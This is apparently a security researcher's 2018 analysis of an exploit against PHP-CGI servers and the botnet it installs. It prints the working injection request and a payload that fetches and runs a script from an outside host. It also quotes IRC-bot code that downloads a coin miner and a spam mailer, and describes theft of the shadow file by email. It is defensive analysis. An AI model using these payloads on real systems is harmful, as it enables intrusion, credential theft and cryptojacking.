---
title: "CGI-BIN PHP Cleaner, Ostensibly"
#author: "Author Name"
description: "Another actor using the same Netgear bug again, resurrecting it.  This time not for cryptomining, but for a botnet."
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-07-20T00:00:00-00:00
draft: false
---

Here's another version of the Netgear DGN bug being used recently - an attack against webservers that have php executable under cgi-bin.  The POST request URL looks like:

```
//cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E
```

Which translates to:

```
//cgi-bin/php?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-d+auto_prepend_file=php://input+-n
```

The body of the request is then:

```
<? system("cd /tmp ; wget hxxp://61.180.181.98/clean ; curl -O hxxp://61.180.181.98/clean ; fetch hxxp://61.180.181.98/clean ; chmod +x clean ; ./clean ; rm -rf clean* ; history -c "); ?>
```

That "clean" script actually begins by cleaning up things some other recent versions of the exploit have left behind...  It kills xmrig, minerd, and several other things that look like part of earlier attacks.  Then it grabs some information about your system, and the shadow file, and mails it all to `marcimarcel221@gmail.com`.

The next step is to download a Perl IRC bot - `hxxp://61.180.181.98/plaintext.txt`.  Virus Total hadn't seen this particular hash yet, but this is a pretty common one.  The specific "configuration" is by "Lucifer@2018", with BTC address "16p68FyW8Pe2mNutg5Qu8afJt18dqX8W5z", at "user@lucifer.services".

This IRC bot actually does a little more...

```
if ($funcarg =~ /^mineBTC (.*)/) {
        my $stringfolder;
    for (0..7) { $stringfolder .= chr( int(rand(25) + 65) ); }
    my $minerUrl = "hxxp://xdss.altervista.org/wp-content/minerBTC/mineryess.tgz";
    system("killall -9 minerd ; cd /tmp ; rm -rf .doc-* ; mkdir .doc-$stringfolder ; cd .doc-$stringfolder ; wget $minerUrl ; curl -O $minerUrl ; fetch $minerUrl ; tar -zxvf mineryess.tgz ; rm -rf  mineryess.tgz* ; mv miner .xdxdx ; cd .xdxdx ; chmod +x * ; nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1Ay4VXFPL93yu1UMpYwBC6P3QqzaQXeHTm -p d=0.5,x11=0.5,qubit=0.5,bitcore=0.5,tribus=0.5,hsr=0,5,phi=0,5,equihash=0.5,hmq1725=0.5,equihash=0.5 >/dev/null &");
        $pid_minerd = `pgrep minerd`;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :^B^C4,1 [BTC MINING]^B ^C9,1STARTED ! PID : $pid_minerd");
        }
```

Download a coin miner from xdss.altervista.org.  Pool specified in there too...

And because one cleaning script isn't enough...

```
if ($funcarg =~ /^cleanbots (.*)/) {
        my $stringfolder;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :^B^C4,1 [CLEAN BOTS]^B ^C9,1STARTED !");
    for (0..7) { $stringfolder .= chr( int(rand(25) + 65) ); }
    my $scripturl = "hxxp://xdss.altervista.org/wp-content/scripts/clean";
    system("cd /tmp ; rm -rf .cl-* ; mkdir .cl-$stringfolder ; cd .cl-$stringfolder ; wget $scripturl ; curl -O $scripturl ; fetch $scripturl ; chmod +x * ; nohup ./clean >/dev/null &");
        system("cd /tmp ; rm -rf .cl-$stringfolder ; history -c");
        }
```

The resulting cleaning script is the same as the earlier one, including the gmail dump address and "plaintext.txt" specification.

All kinds of little tools to download from different places...

```
if ($funcarg =~ /^startsend (.*)/) {
  my $target1 = "$1";
  my $target2 = "$2";
  my $stringfolder;
    for (0..7) { $stringfolder .= chr( int(rand(25) + 65) ); }
    my $senderUrl = "hxxp://xhost.altervista.org/wp-content/ten/2018/send/send.tgz";
    system("cd /tmp ; rm -rf .snd-* ; mkdir .snd-$stringfolder ; cd .snd-$stringfolder ; echo $meunick > `pwd`/botnick ; wget $senderUrl ; curl -O $senderUrl ; fetch $senderUrl ; tar -zxvf send.tgz ; rm -rf  send.tgz* ; chmod +x * ; nohup php send.php $target1 $target2 ; cd /tmp ; rm -rf .snd-$stringfolder >/dev/null &");
    sendraw($IRC_cur_socket, "PRIVMSG $printl :^B^C4,1 [E-mail sending]^B ^C9,1STARTED ! File : $target1 $target2");
  }
```

"send.tgz" includes a php script which will require some deobfuscation, it uses a ton of "\x" encoding, then further uses a bunch of indirection through PHP global variables...  After some analysis, it looks like a script that uses a variety of indirection means to be commanded to send email.  There seems to be support for reading a file mapping IRC bot nicknames to email addresses.  This would be handy when trying to use a botnet to send email to a bunch of destinations.  The content seems to come from a set URL, then the IRC controller can command bots to read the list of emails from a URL specified in the command.

"miner.tgz" contains a copy of [cpuminer-yescrypt](https://github.com/GlobalBoost/cpuminer-yescrypt).  It even includes the source...  It even includes the .git directory, actually, which reveals that its origin was actually [noncepool's version](https://github.com/noncepool/cpuminer-yescrypt.git).  The config log reveals that configuration was run on "vmd3959.contabo.net", "3.2.0-4-amd64", "Debian 3.2.51-1", but "gcc version 4.7.2 (Debian 4.7.2-5)".

This specific compile of minerd (SHA256 925e4a411a254cb3364b8dd5c3c184ba92bd1100a4ae06902f3905ceeb38c4a0) was first uploaded to VirusTotal on 19 Oct, 2017, and the compile times (preserved because it's from a tar file) were from 10 Jun, 2017, so generally in-line.
